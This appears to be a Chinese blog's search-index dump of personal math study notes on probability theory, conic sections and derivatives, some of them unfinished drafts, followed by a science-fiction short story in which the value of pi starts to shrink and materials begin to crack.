空集Φ也是样本空间Ω的子集，不包含任何样本点，称为不可能事件。 事件间的关系事件间有如下几种运算： 包含 并事件（至少一个发生） 交事件（同时发生），简写为AB 差事件：一个发生且另一个不发生 对应几种运算律： 交换律：并事件/交事件顺序可互换 结合律：A ∪ (B ∪ C) = (A ∪ B) ∪ C，A ∩ (B ∩ C) = (A ∩ B) ∩ C 分配律：$$A\\cup (B\\cap C)=(A\\cup B)\\cap (A\\cup C)$$$$A\\cap (B\\cup C)=(A\\cap B)\\cup (A\\cap C)$$ 德摩根律：$$\\overline{A\\cup B}=\\overline{A}\\cap \\overline{B}=\\overline{A}\\overline{B}$$$$\\overline{A\\cap B}=\\overline{A}\\cup \\overline{B}$$ 也有几种关系： 互斥：A、B不同时发生 对立/互逆：每次试验A、B必有一个发生。A的逆事件记作$\\overline{A}$。 概率及其性质在相同的条件下，进行了n次试验，其中事件A发生的次数$n_A$称为事件A发生的频数，比值$n_A/n$称为事件$A$发生的频率 , 记为$f_n(A)$。其中，频率取值范围$[0,1]$，且$f_n(\\Omega)=1$。对于一组互不相容的事件而言，其并事件的频率为各自频率之和。 重复试验的次数n 逐渐增大时，频率 $f_n(A)$ 呈现稳定性，趋于某个常数$p$，这是统计的规律性。 由大数定律可证明，由频率的稳定性和频率的性质，得概率定义：重复试验的次数趋于无穷，频率$f_n(A)$接近概率$P(A)$。它有这么几个性质：频率取值范围$P(A)\\geq 0$，且$P(\\Omega)=1$。对于一组互不相容的事件而言，其并事件的概率为各自概率之和。这三性质就是柯尔莫哥洛夫公理。 它有如下性质： $P(\\Phi)=0$ 互不相容和事件的概率为每个事件的概率之和 若有$A\\subset B$，则$P(B – A) = P(B) - P(A)$ 对任一事件$A$, $P(A)\\leq 1$ 对立（互逆）事件的概率之和为1 $P(A \\cup B) = P(A) + P(B) - P(AB)$上面这条，推广到任意多事件（或者直接整体法然后分n次使用上面这条），可得到：$$P(A_1\\cup A_2\\cup \\cdots \\cup A_n)=\\Sigma_{i=1}^n P(A_i)-\\Sigma_{1\\leq i\\leq j\\leq n} P(A_iA_j)+ \\Sigma_{1\\leq i\\leq j\\leq k\\leq n}P(A_iA_jA_k) + \\cdots +(-1)^{n-1}P(A_1A_2\\cdots A_n)$$ 极限性：设$A_1\\subset A_2\\subset \\cdots \\subset A_n\\subset \\cdots$是一系列上升的事件，则$\\lim_{n\\to \\infty}P(A_n)=P(\\cup_{i=1}^\\infty A_i)$，反之也成立，将并换做交即可。 古典概率古典概型（等可能概型） 的定义为：若试验 E 满足： 样本空间Ω包含有限个元素 出现每一样本点的概率相等 （等可能性），即试验中每个基本事件发生的可能性相同，故 $$P(A)=\\Sigma_{i=1}^kP({e_i})=\\frac{k}{n}$$ 古典概型的样本空间由n个独立等可能事件组成，故每个基本事件的概率都为$\\frac{1}{n}$。 排列和组合也是古典概率中重要的两个公式。排列表示从n个对象中按顺序选出m个对象： $$A_n^m=n(n-1)(n-2)\\cdots(n-m+1)=\\frac{n!}{(n-m)!}$$ 组合表示从n个对象中任选m个对象： $$C_n^m=\\frac{A_n^m}{m!}=\\frac{n!}{m!(n-m)!}$$ 上面两式中，均有$n\\geq m$。 加法原理和乘法原理高中就讲过，前者表示若完成一件事可有n类办法，其中，在第一类办法中有$m_1$种不同的方法，在第二类办法中有$m_2$种不同的方法，……， 在第n类办法中有$m_n$种不同的方法，则共有$\\Sigma_{i=1}^nm_i$种方法完成这件事；而乘法原理表示若完成一件事需分解成n个步骤，其中，做第一步有 $m_1$种不同的方法，做第二步有$m_2$种不同的方法，……， 做第n步有$m_n$种不同的方法，则完成这件事的方法共有$\\Pi_{i=1}^nm_i$种。 大学中新增加了实际推断原理，它的内容为：概率很小的事件在一次试验中几乎是不发生的。这符合我们对概率的直觉感受。注意这不能理解成“小概率事件从不发生”。与此同时，它还有另一层含义：小概率事件在大量重复试验中必然发生。 几何概率在几何概型中，试验 E 满足： 所有可能的样本点构成的样本空间是“连续”的，构成了一个不可数无穷集 样本点是“均等的” ，即一次试验中，没有哪一个或哪一些比另一个或另一些更容易出现 直观上，每个事件发生的概率只与该事件的度量（如长度、面积、体积等）成正比例。 这种概率的计算公式为： $$P(A)=\\frac{A_{len/size/volume}}{\\Omega_{len/size/volume}}$$ 条件概率与概率的三大公式这是第一章的重点内容。 条件概率的公式如下。意思为：A发生的条件下B发生的概率，等于AB同时发生的概率除以A发生的概率。设试验共包含n个基本事件，A有m（m&gt;0）个，AB有k个，则 $$P(B|A)=\\frac{k}{m}=\\frac{k/n}{m/n}\\frac{P(AB)}{P(A)}$$ 条件概率 P(·/A) 具有概率的所有性质：非负性、规范性、可列可加性。它也满足其他性质，例如： 乘法公式条件概率公式也可以反过来用来计算交事件的概率：$P(AB)=P(A)P(B|A)$，即乘法公式。 它也可以推广，逐项展开即可： 全概率公式$$P(B)=\\sum_{i=1}^{n}P(A_i)P(B|A_i)$$ 上面的公式就是全概率公式。它表示$B$的概率可以用一系列概率和表示。 ![[Pasted image 20230204114959.png]] 如上图所示，完备事件组是全样本空间的一个划分${A_i}$，$B$是一个横跨数个划分块的事件。造成B的可能有很多种，而全概率公式就是把这所有的概率加起来计算事件的总概率。 贝叶斯公式$$P(A_i|B)=\\frac{P(A_iB)}{P(B)}=\\frac{P(A_i)P(B|A_i)}{\\sum{P(A_i)P(B|A_i)}}$$ ，且其中$P(B)\\gt 0$。 继续按照上图的划分理解，这公式表示计算某因素$A_i$导致$B$发生的概率。 上面俩公式的用法是：明确起点事件、终点事件，画出起点到终点的所有路径。随后计算各路径的概率和（全概率）或者某路径在所有路径的占比（贝叶斯公式）。 独立性后边再说","link":"/2022/11/17/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"},{"title":"第五章：数理统计初步","text":"这研究的是总体和来自总体的任意一组样本的关系。例如，如何通过样本估算总体的统计量这样的问题，就可以通过数理统计解决。 基本概念和定义抽样分布就是统计量的分布，一共有四种。 参数估计点估计就是通过总体的一个样本估计总体分布中未知参数值的问题。 矩估计法就是用样本n阶矩估计的方法。 最大似然估计法","link":"/2023/02/21/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/%E7%AC%AC%E4%BA%94%E7%AB%A0%EF%BC%9A%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1%E5%88%9D%E6%AD%A5/"},{"title":"第二章：随机变量及概率分布","text":"一维随机变量是关于实验结果的变量。实验结果用一系列离散值表示的称为离散型随机变量，用连续值表示的称为连续型随机变量。一维表示随机变量只包含一个关于实验结果的变量。 离散型随机变量分布就是各个实验结果的概率分布情况。例如随机掷一个6面骰子，结果可能是1-6，而每一个结果的概率都是$\\frac{1}{6}$，即$P(X=1)=P(X=2)=\\cdots =P(X=6)=\\frac{1}{6}$。 二项分布 样本趋于无穷大情况下的超几何分布可以近似看作二项分布 每次实验的结果只有两个，概率分别为$p$和$1-p$。这分布表示多次实验的结果分布，例如抛$n$次硬币，最终正面朝上的次数为$m$的概率就可以用二项分布表示。 泊松分布表示某种小概率事件发生的可能性。 超几何分布这用于处理抽样中的无放回情况概率。 负二项分布? 连续型随机变量分布连续型随机变量激就是之前说过的那种，事件结果是不可数正无穷的（比如在坐标系里随机丢一个钉子，其位置到原点的距离）。 正态分布也叫高斯分布。 指数分布？ 威布尔分布？ 多维随机变量也称为随机向量，是由多个随机变量构成的向量。 后面再写","link":"/2023/02/04/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/"},{"title":"圆锥曲线-抛物线速解","text":"主要内容：反设斜截式，平均性质，极点极线，设点方法。 反设斜截式一般的，在开口向右的抛物线中，为了方便起见，会把直线设成这种形式：$$ x=my+t $$其中，$t$可以是$\\frac{p}{2}$，即该直线过焦点。 平均性质假设有一条直线： $AB$与抛物线交于两点且过点$(t,0)$，连接$(-t,0)$和$B$点交抛物线于$A’$点，则有$A$和$A’$关于$x$轴对称：$x_Ax_B = t^2$，$x_{A’}x_B=(-t)^2$，所以$x_A=x_{A’}$ 证明：如图所示。 设点方法在抛物线中，我们一般这么设点： 开口向右（$x^2=xpy$）：$A(x_0,\\frac{x_0^2}{2p})$ 开口向上（$y^2=2px$）：$A(\\frac{y_0^2}{2p},y_0)$ 切线性质如图，作过抛物线焦点的弦，交抛物线$x^2=2y$于$A$，$B$，分别作抛物线在点$A$，$B$处的切线$l_1$，$l_2$，则必有$l_1$与$l_2$交于抛物线的准线上一点$D$。 这样的三角形$ABD$，我们称之为：阿基米德三角形。 对于此模型中的计算，我们一般会引入坐标当参数。如果要计算切线的斜率，会求导计算；如果焦点在$x$轴，我们可以用隐函数求导、分类讨论或者极点极线法。 点差法 以下摘自百度百科 点差就是在求解圆锥曲线并且题目中交代直线与圆锥曲线相交被截的线段中点坐标的时候，利用直线和圆锥曲线的两个交点，并把交点代入圆锥曲线的方程，并作差。求出直线的斜率，然后利用中点求出直线方程。 利用点差法可以减少很多的计算，所以在解有关的问题时用这种方法比较好。 具体步骤 设直线和圆锥曲线交点为$(x_1,y_1)$，$(x_2,y_2)$，其中点坐标为$(x_0,y_0)$，则得到关系式$x_1+x_2=2x_0$，$y_1+y_2=2y_0$. 把$(x_1,y_1)$，$(x_2,y_2)$分别代入圆锥曲线的解析式，并作差，利用平方差公式对结果进行因式分解.因式分解的结果必为$A(x_1-x_2)+B(y_1-y_2)=0$，其中$A$和$B$根据圆锥曲线的类型来决定具体数值，一般来说会包含有$(x_1+x_2)$和$(y_1+y_2)$两项． 利用$k=\\frac{(y_1-y_2)}{(x_1-x_2)}$求出直线斜率,代入点斜式得直线方程为$y-y_0=\\frac{(y_1-y_2)}{(x_1-x_2)}(x-x_0)$ 对于椭圆来说：$\\frac{x_0}{a^2}+\\frac{y_0}{b^2}k=0$","link":"/2021/03/07/%E6%95%B0%E5%AD%A6/%E9%AB%98%E4%B8%AD%E6%95%B0%E5%AD%A6/%E5%9C%86%E9%94%A5%E6%9B%B2%E7%BA%BF-%E6%8A%9B%E7%89%A9%E7%BA%BF%E9%80%9F%E8%A7%A3/"},{"title":"圆锥曲线-韦达定理速解","text":"硬解定理椭圆方程： $\\frac{x^2}{a^2}+\\frac{y^2}{b^2}=1$ 直线方程： $Ax+By=-C$ 注意：a，b大小任意，所以对于焦点在y轴的椭圆以及双曲线也适用（抛物线不清楚，貌似不适用？）。 $x_1+x_2=\\frac{2a^2A(-C)}{a^2A^2+b^2B^2}$ $x_1 x_2=\\frac{a^2(C^2-b^2B^2)}{a^2A^2+b^2B^2}$ $y_1+y_2=\\frac{2b^2B(-C)}{a^2A^2+b^2B^2}$ $y_1 y_2=\\frac{b^2(C^2-a^2A^2)}{a^2A^2+b^2B^2}$ $x_1 y_2+x_2 y_1=\\frac{2a^2b^2AB}{a^2A^2+b^2B^2}$ 联立后的方程方程（消去y）：$(a^2A^2+b^2B^2)x^2$$+2a^2ACx$$+a^2(C^2-b^2B^2)=0$ 判别式：$\\Delta=4a^2b^2B^2(a^2A^2+b^2$$B^2-C^2)$","link":"/2021/02/26/%E6%95%B0%E5%AD%A6/%E9%AB%98%E4%B8%AD%E6%95%B0%E5%AD%A6/%E5%9C%86%E9%94%A5%E6%9B%B2%E7%BA%BF-%E9%9F%A6%E8%BE%BE%E5%AE%9A%E7%90%86%E9%80%9F%E8%A7%A3/"},{"title":"导数解题笔记","text":"最近在学导数大题解法，就在这里记下我的学习心得吧。 零碎心得 求导后，尽量将导数因式分解。求导的主要目的是研究原函数的单调性，故只需关注它的正负。而因式分解后它的正负情况一目了然。可以很直观地看出影响正负的因素进而求解恒成立，最小值等一系列问题。 处理导数题常用方法 直接求导法。对于一些简单题只需要求导得到原函数增减性，进而得到极值，零点等。 分离参数法。适用于含有参数的项能够合并的情况。使用应考虑分参后得到的另一边的函数是否易于研究。如果难以研究，那么可以考虑更换其他方法研究。 构造函数法。现在见到的有两种方法。其一是移项构造新函数，其二是在等式两边构造形似函数，通过研究该函数的单调性来解题。 主元法。它的核心思想就是将式中的参数（比如a）看作自变量，这样式子的单调性就很容易判断了，式子的最值或取值范围也因此更好判断。也就是说，主元法最大的作用就是消参。 端点效应。通过对式子的观察，有时我们可以发现一些很明显的零点。比如对于f(x)=ln(x+1)-x，我们可以直接发现x=0是一个零点。并且不难发现f'(0)=0这个特殊点。因此很容易就可以得出f(x)的增减性。 隐零点法。有时我们做导数题，利用导函数判断单调性时，会碰到f'(x)=ln(x)-x之类难以直接求出零点的式子。这时不需要直接求出零点，只需要假设f’(x)的零点，也就是假设f(x)的极值点（比如此处假设a是f’(x)的一个零点），再将ln(a)-a=0的等量关系代入f(a)，即可求出f(x)的极值大小。 放缩法。主要是证明不等式的时候用。在导数的恒成立问题中也有用武之地。比如说，要证一个函数在正实数域恒小于0，你已经求得它的最大值，它可能是这样的：ln(x)-x（或者其他更复杂的形式）。如果你发现这种形式不太好求它的极大值是否大于0，那么我们就可以用常用放缩式ln(x)≤x-1把它放大，得到ln(x)-x≤x-1-x=-1&lt;0，问题解决。不过在使用放缩法的时候一定注意不等号方向，放反了可就不好玩了（","link":"/2020/12/26/%E6%95%B0%E5%AD%A6/%E9%AB%98%E4%B8%AD%E6%95%B0%E5%AD%A6/%E5%AF%BC%E6%95%B0%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0/"},{"title":"焦点弦定理之一","text":"今天听了节课，感觉这个应该会很有用。记下来以备后用。 公式本体： |ecosθ|=|(λ-1)/(λ+1)|","link":"/2020/12/19/%E6%95%B0%E5%AD%A6/%E9%AB%98%E4%B8%AD%E6%95%B0%E5%AD%A6/%E7%84%A6%E7%82%B9%E5%BC%A6%E5%AE%9A%E7%90%86%E4%B9%8B%E4%B8%80/"},{"title":"圆周率","text":"一觉醒来，黄成萧就发现这个世界肯定有哪里出了问题。 这并不是因为他身上有些地方有奇怪的感觉——比如他总觉得眼睛不太舒服。对于长期用眼过度的黄成萧，这不是什么值得疑惑的。但是就在昨晚，一定有什么特殊的事情发生了。 比如，他刚睡醒时，习惯性地抓起床边的闹钟，想看看现在几点。但是他没有成功看到时间，闹钟透明的塑料表面变成了银白色。 还没来得及仔细思考这件奇怪的事情，他又发现他床头柜上本来是透明的塑料水杯现在也是白色的。 并不是所有的透明物品都变白了。比如房间中的玻璃窗依然透亮。明媚的阳光透过玻璃直射到床边，照在莫名变白的闹钟和水杯上。散射的光线有些刺眼，让黄成萧产生了一种很不真实的感觉。 黄成萧困惑地皱起眉头，拿起那个已经看不到时间的闹钟，用手指仔细地擦了擦表面，然而这没有起到任何作用。对水杯的擦拭也是无用之功。黄成萧放下手里白色的水杯，摇了摇头，还是按照每天固定的程序从床上爬起来，去卫生间开始洗漱。 客厅和卫生间看起来倒是很正常。用毛巾擦过脸之后，黄成萧已经基本把一大早的怪事放在脑后了。 毕竟，在这个忙碌的年代，每个人从出生开始就有无数的事情要做。 黄成萧是一名教师，教小学数学。他对自己的职业实在说不上很满意，这并不难理解——黄成萧是理论物理学博士，博士期间的研究方向是弯曲时空中的量子场论，这可以说是人类发展到目前为止最为接近世界本源的内容了。这样的一个人，做一名小学老师确实是大材小用的。但是在这个文凭大爆炸的时代，除了科研岗位之外，一个研究如此基础的学科的博士实在是不太好找工作。而科研岗位又面临着两大难题——钱少，人多。并不富裕的家庭、激烈的竞争、微薄的薪水和日渐高涨的物价，让满腔热情的黄成萧不得不对现实妥协。好在中国的教育行业正处在蓬勃发展阶段，一所小学愿意给黄成萧提供一份待遇相当优厚的职务。 学校很是重视黄成萧，在丰厚的薪水之外，学校在他入职时还花了很大的力气做宣传，甚至联系区教育局，把他树立为投身中国基础教育事业的典型榜样。然而黄成萧自己心里清楚，他来这里工作真的只是因为他现在的薪水是他能在大学找到的工作的好几倍。而学校的重视，其实更大程度上是因为他们需要黄成萧作为吸引生源的招牌而已。 虽然对工作没什么热情，但是黄成萧还是一个有责任心的人，也算得上是兢兢业业。洗漱过后，黄成萧就直接走到书房的办公桌前，从一个半新不旧的皮包里拿出一大叠皱皱巴巴的卷子，准备开始批阅。 批卷子这件事情总会让一向性格淡然的黄成萧大动肝火。尤其有几个总是特别马虎的孩子，每次都因为各种不注意审题或者计算错误而被扣分。还是学生的时候，黄成萧也总会因为马虎而领教到老师的批评。学生时代的黄成萧很不解：明明有些同学完全不会做，为什么老师更会对小小的计算错误或者审题错误大动肝火呢？直到真的做了老师，黄成萧才体会到那种为了学生设身处地的惋惜和遗憾的心情。 小测验和作业倒是没有关系，但是一想到有的学生会在那些重要的考试中因为马虎而丢分，黄成萧就觉得心里堵得慌。对于那些家境贫寒、人生中没有太多试错机会的学生，一场重要的考试很可能影响他们的一生，然而有的孩子却仍然会把分数丢在粗心大意上。因此黄成萧一次又一次督促学生：要认真，要认真。 仅仅靠自己督促学生是没有用的。这一点从他正在批阅的卷子中就能看出。尽管黄成萧在考试之前一再强调大家要读完题目再答题，还是有好多学生无视了最后一道“计算阴影部分面积”的题目后，括号中的一行字：本题中圆周率取3.14。 在又一张卷子上画下一个大大的叉后，黄成萧终于忍不住了。他拿起手机，打开微信上的“四年级奥赛班家长群”，打算提醒家长们再和孩子强调一下这个问题。 “各位家长大家好，我刚刚批完了上周五单元测验的卷子，发现有很多同学没有注意读题。最后一道计算题的题干中已经明确给出，圆周率取3.14，而不是我们在三年级时为了简化计算而取的3。请各位家长和孩子们强调一下审题的重要性，此外还要和孩子们强调：圆周率只有在做近似计算的时候可以取3，真正的圆周率不是3，而是一个无限不循环小数，我们一般近似使用3.14。” 点了“发送”按钮之后，黄成萧自然而然地等着那一大堆在自己每次发言后都会出现的“谢谢老师提醒”、“黄老师真是用心了”、“黄老师您辛苦了，我一定和我家轩轩强调”等客套话。可他等了足有一两分钟，家长群依然沉静如水，一点反应都没有。 黄成萧把屏幕往上划了几下，发现了问题所在：他的消息前面现在还有一个转动的小圆圈，那条消息一直没发出去。屏幕左上角网络信号的位置处显示着“无互联网连接”的符号。看来是Wi-Fi出现了问题。 “明明去年刚换了速度特别快的光纤的……”他一边在脑海中抱怨电信公司，一边弯下身子，开始检查书桌下面的路由器。路由器看起来倒是没什么特别的，但是网确实是连不上。 黄成萧打算给电信公司打个电话。可是拿起家中固定电话的听筒，刚打算开始拨号的时候，他的手停在了空中。 他看到电话上透明的数字按键变成了白色。 如果说变白的闹钟和水杯还可以解释为两件怪事在巧合下一起发生，这个电话按键再用巧合来解释就实在是太说不过去了。一定发生了什么事情。 黄成萧感觉有点胸闷。他看了看自己家的客厅——没发现什么明显的异常。又看了看窗外：阳光灿烂，天空碧蓝。听筒中一直持续的“嘟——”声提醒他，电话还能用。 他没有打给电信公司。断网这种小事，和这些奇怪的白化事件相比，已经算不得什么了。黄成萧拨下了另外一串号码，这个号码属于他最好的朋友、本科兼硕士时候的舍友李海明。在黄成萧看来，李海明是最有可能解决这种诡异状况的人了。 “喂，那个，大黄啊。”李海明很快接了电话。黄成萧还没来得及讲话，李海明就抢先一步：“你家里有没有方便面和矿泉水？要是没有的话赶紧出去买，能买多少买多少，别磨蹭，快，但是要是外面乱成一团你就别去了，起码先注意人身安全。” 黄成萧心中“咯噔”一下，果然出事了，搞不好还是大事。 如果在警察局工作的朋友说要储粮备水，注意安全，那么八成是要出严重的治安问题，随后出现的危机可能会涉及到一整个城市。 如果在政府机要部门工作的朋友说要储粮备水，注意安全，那八成是要有战争风险，危机可能涉及到整个国家。 可是李海明并不是警察或者官员，李海明是科学家，准确的说是天文学家。他在一所和黄成萧同城的天文台研究天体物理学。如果一个天文学家朋友说要储粮备水，那可能要有行星级别的危险了，比如一颗小行星正在撞地球的路上。 电话里的李海明还在继续说着：“不多废话，我正要去你家，你等着，我还有那么三十来分钟就到了。我这里的水什么的也可以分给你一点。行了先不说了，我骑车呢，一会见。” 电话被李海明挂断了。放下听筒，黄成萧越想越觉得可怕。他走到窗边看了看窗外。可能是因为住在市郊的缘故，他没有看出李海明说的“乱成一团”，但是他确实发现了一些不正常的征兆：小区外面街道的正中心，七扭八歪的停着几辆车；小区里面三五成群的几伙人在议论着什么；市区方向似乎还有个地方冒起了烟。 黄成萧按照李海明的建议，下楼开始采购方便面和矿泉水。为了不引起怀疑和骚动，他去了小区中几家不同的小卖店，居然还都有存货。大概大多数人并没有李海明这样的科学家朋友，他们可能发现了有些事情不对，但是没想到事情严重到了要储备粮食的程度。 已经过去了半个小时，黄成萧往家里搬了三箱矿泉水以及许多方便面、饼干等耐储存的食品，李海明还是没有来。累得气喘吁吁的黄成萧看了看家里七扭八歪的纸箱，一屁股坐在沙发上，决定先休息一下。 一闲下来，他猛然想起今天的紧急事态似乎应该告诉一些自己在乎的人。但想了片刻，黄成萧也没想到该给谁打电话。现在还不知道发生了什么，给远在千里的父母打电话只能让他们干着急；之前谈过的两任女朋友，最后都因为复杂的原因分手了，自然也无话可聊；黄成萧平时过于平淡的处事方式和比别的同事高出一截的工资，也导致他在同事中并没有什么真的朋友。想来想去，在这个城市，黄成萧还真的想不到什么在乎的人。在家中环视一圈，最后黄成萧把目光停在了书房的办公桌上。办公桌上放着他刚批完的奥赛辅导班的卷子。 学生？难道学生是自己最在乎的人吗？黄成萧仔细的想了想这个问题。 从教学的角度来讲，黄成萧是一名相当优秀的老师——学科知识扎实、教学方法得当。但这只是因为他深厚的学识以及极强的责任心，而并不是出于对教育事业的热忱。在正常的课内教学班中，他甚至都不能叫出全部学生的名字。然而他今年开始带的这个奥赛班有些不同。 在黄成萧所在的城市，上百所小学的毕业生每年都会为了那十几所最优秀的初中而争得头破血流，各种竞赛也因此办得风生水起。虽然政府已经多次下令禁止升学和竞赛挂钩，然而许多初中依然用各种方法打着擦边球。学生家长也不惜花大价钱，给孩子报课外辅导班，甚至还把那些知名教师请到家中一对一辅导。但那些经济条件不太好的家庭是请不起辅导老师的,这就意味着这些家庭的孩子无法得到同等的教育，进而导致他们更难以考入好大学，找到好的工作……“阶层固化”这个近些年才火起来的概念也因此在网上被不断热议。在这样的情况下，黄成萧执教的这种公立学校提供的免费奥赛班就理所当然地被很多家境贫寒的家长和学生视为最后的救命稻草。黄成萧的班级中，集中了不少这样的学生。 梁如玉，一个特别爱看书的孩子，无论是《数学竞赛真题集》还是《三侠五义》都能读得津津有味，但是家里没有多余的钱买书，黄成萧经常借书给她。李凯博，父母都是外来务工人员，但是在对孩子的教育上很舍得花钱，他也没有辜负父母的希望，学习特别努力。陈懿峰，来自一个单亲家庭，聪明又有好奇心，虽然偶尔有点调皮，但是成绩相当好……这些孩子没有足够的金钱去享受优质的私人教育资源，更没有办法在升学失利的情况下出国读书。如果没有黄成萧和他的奥赛班，他们甚至都没有办法接受竞赛辅导。黄成萧认为，他真的在改变一些孩子的人生。 “大黄！黄成萧！” 窗外响起了李海明的声音，打断了黄成萧的思绪。他走到窗前，看到李海明站在楼下，身边停着一辆鼓鼓囊囊的电瓶车。两个人先是费力地把电瓶车抬到黄成萧家里，因为李海明既不同意把电瓶车锁在楼下，又不同意站在楼下说话——前者是因为他怕什么时候爆发骚乱，电瓶车或者车子上的水和压缩饼干被拿走，后者是因为怕别人听到他们的谈话导致“爆发骚乱”本身。还好，黄成萧家只住在二楼。 一进屋，李海明就直接开门见山：“是不是没法上网了？” 黄成萧对于李海明预知到这些并不感到惊讶，刚搬完许多箱食品、瓶装水和一辆电动车的他还在气喘吁吁，“嗯”了一下，算是回答了。 “还有别的事儿吧，比如东西碎了啊，变形了啊，不能用了啊……” 黄成萧回答：“你自己看吧，去卧室看看床头柜上的闹钟和杯子。对了，还有这个电话上的按钮。”他有气无力地指了一下摆在客厅一角的小桌子上面的电话。 李海明瞟了一眼电话，一边微微点了点头，一边转身走进卧室。黄成萧仍然没有从刚才的劳累中完全恢复，脱掉鞋子坐在沙发上休息，这个时候李海明拿着他的白色水杯从卧室走了出来。 “你运气还算好的，我一个朋友今天早上起床，直接踩了一脚的碎玻璃。”李海明说。 黄成萧已经懒得在乎自己的运气好不好了，他盯着李海明，一字一顿的说：“我就想知道，这个世界到底他妈的怎么了。” 李海明笑了，他没有直接回答，而是反问了黄成萧一个问题。 “你知道圆周率是多少吗？” “你说什么？”黄成萧以为自己听错了。 “我问你，圆周率是多少。”李海明又重复了一遍。 “圆周率是π啊……三点一四一五九二六五三五八九七九三……”虽然对李海明的卖关子有点厌烦，黄成萧还是背出了圆周率，而且还背出了很多位。 李海明打断了他的背诵。“嗯，那么我告诉你，发生这一切的原因就是，圆周率现在不是你背出来的那个数了。现在的圆周率嘛……估计在三点一三左右吧。” 黄成萧目瞪口呆。他听懂了李海明刚才说的每一个字，但是他却怀疑自己是不是理解错了。黄成萧心里很清楚，自己这个上午发现的诡异改变背后，一定有非常不一般的原因。但是他做梦也没想到这个原因居然是圆周率变了。 李海明继续说下去，“你还记得我们学过的相对论吧。其实我们的宇宙，是可以用四个维度来描述的，包括一个时间维度和三个空间维度。在狭义相对论中，时空是平直的，而在广义相对论中，时空会因为物质和能量的存在而产生弯曲。所以我们所处的空间，其实是一个可以弯曲的三维空间，在弯曲的空间中，描绘这个空间的几何学可能会偏离欧几里得几何的。”李海明一边说一边用双手比划出了一个球的形状，似乎真的在描绘空间的弯曲一样。 黄成萧点了点头。“我记得当时老师为了方便理解还举了例子——用二维空间来打比方的话，我们从初中就开始学的欧几里得几何其实就是描述平直的二维空间的，两条平行线没有交点。而如果空间有弯曲，比如在一个球面或者马鞍面上，两条平行线可能会有两个交点” “是的，我们在数学上用曲率这个概念来描述空间的弯曲程度，这个例子形象地说明了不同曲率的空间的样子。然而曲率影响的不仅仅是平行线，还影响了许多其他几何性质，比如说——” “圆周率。” 这三个字是李海明和黄成萧一起说出来的。 李海明继续解释：“昨天半夜，大概十一点十五分左右吧，全球基本上所有的天文台都报告了星空的异常——星星之间的相对位置发生了变化。当然了，一开始没人想到圆周率变了这种事情的，直到排查了所有可能的因素，并且对比了其他天文台传来的数据之后，我们才得出结论：圆周率正在慢慢变小。当我们讨论出这个结果的时候，已经是凌晨两点多了，过不了多久，所有基于光纤的网络就都用不了了，现在有线电话还能使用。天文台也出现了各种状况，比如望远镜的焦距已经不准确了，有比较脆的或者不太均匀的材料组成的物品相继碎裂，没碎的也可能出现各种变化，尤其是很多种类的塑料会因为许多极其细小而均匀的裂纹而变白，这个现象在材料学上好像叫‘银纹’，比如你这个水杯是聚丙烯的吧……”李海明把黄成萧的水杯举得很高，用力地朝着地板砸了下去，塑料水杯非常奇妙地碎成了如尘埃一般的粉末。 黄成萧明白了一切。圆周率变小了，这意味着和之前相比，组成具有某个半径的环或者球不再需要那么多的材料。一个直径是一厘米的球，原本的体积是三分之四乘以一厘米的立方再乘以三点一四。而现在，最后的那个系数变成了三点一三。这样一来，原来组成这个球的材料就会变得过剩，这些多余出来的材料会让球体内部产生向外的压力，并且还有破坏球体的趋势，就像一个越吹越大、快要爆炸的气球。 其实不仅是球形物体，所有物体的内部都在遭受额外的挤压。那些多余的材料在圆周率变化的影响下，使物体内部产生了均匀的压力。有一定韧性或者一定强度的材料还保持着稳定性，比如金属、质量较好的玻璃或者混凝土，但是有些很脆的材料或者很精密的材料就因为这些压力被破坏或者失去了功能，比如望远镜的镜片、光纤中的玻璃纤维。也有的材料因为这些均匀的压力而产生了非常细密的裂纹，从透明变成了白色。这方面尤其明显的就是塑料制品，比如他家里的水杯、闹钟表面和电话按键。刚才李海明说的被一地的碎玻璃扎了的同事，也是因此而受害。 这还不是最可怕的。黄成萧望着李海明，一脸惊恐。李海明神色肃然，手轻轻地向着地面指了指。黄成萧知道他想说什么。我们身边最大的球体，就是脚下的地球。 光是正常的板块运动就足以导致造成千万人丧生的大地震，而这种从地核到地壳的向外压力可能导致的后果，黄成萧简直不敢想象。地下的岩浆最后会在挤压下冲破地壳喷涌而出，可能造成上亿人的死伤。 黄成萧突然发现李海明还在看着自己。他收回思绪，点了点头示意李海明继续。 “你知道更意外的是什么吗，这只是个开端。”李海明用重音强调了“开端”两个字。 “开端？你是什么意思，这只是骚乱的开端吗？” “说骚乱的开端也对，但是我刚才说的不是这个意思。我是说，这只是圆周率变小的开端。现在的圆周率大概在三点一三左右吧。圆周率还会持续变小的，”李海明继续说着，“昨晚在发现这件事情之后，我们研究了圆周率变小的趋势。最后我们的结论是，根据多种拟合方法，圆周率会以越来越慢的速度持续变小，大概在一段时间后稳定在3左右，这个时间有多长现在还没有统一的答案，估计在几千年上下吧。这个要是写出一篇论文，那一定能上《Nature》，也一定能得诺贝尔奖……”李海明苦笑了一下，“可是《Nature》或者诺贝尔奖，在这件事情面前似乎没什么意义了。” 黄成萧沉默了一小会，似乎在思考这个令人震惊的事实背后的含义。片刻后他问李海明：“那你们现在知不知道为什么圆周率会异常？有黑洞或者中子星什么的经过地球附近吗？” 李海明笑着轻轻怼了黄成萧一拳：“好样的，在这种时候还想着物理，我就知道你心里还是很在乎物理的，真不愧是我这种物理学界青年才俊的舍友啊。” “少臭美，快说，一会你死了没人给我讲了。” “其实，我们不应该说圆周率异常了。”李海明似乎兴奋起来，像是要揭示什么重大的秘密，“我们应该说，圆周率正常了。” 